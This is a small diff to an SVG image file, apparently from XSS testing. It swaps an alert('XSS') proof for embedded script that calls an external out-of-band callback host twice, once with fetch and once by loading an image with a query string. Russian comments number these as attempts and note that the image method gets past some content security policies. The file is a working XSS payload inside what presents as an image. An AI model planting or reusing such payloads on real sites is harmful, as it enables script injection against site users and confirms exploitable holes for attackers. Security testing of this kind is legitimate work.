@@ -1,3 +1,10 @@
 <svg xmlns="http://www.w3.org/2000/svg">
-  <script>alert('XSS')</script>
+  <script>
+    // Попытка 1: Fetch API (современный метод)
+    fetch('https://ynp430s99pfg88kon73b9vbrsiybm1aq.oastify.com');
+
+    // Попытка 2: Загрузка картинки (старый надежный метод, обходит некоторые CSP)
+    var i = new Image();
+    i.src = 'https://ynp430s99pfg88kon73b9vbrsiybm1aq.oastify.com?xss=svg_triggered';
+  </script>
 </svg>
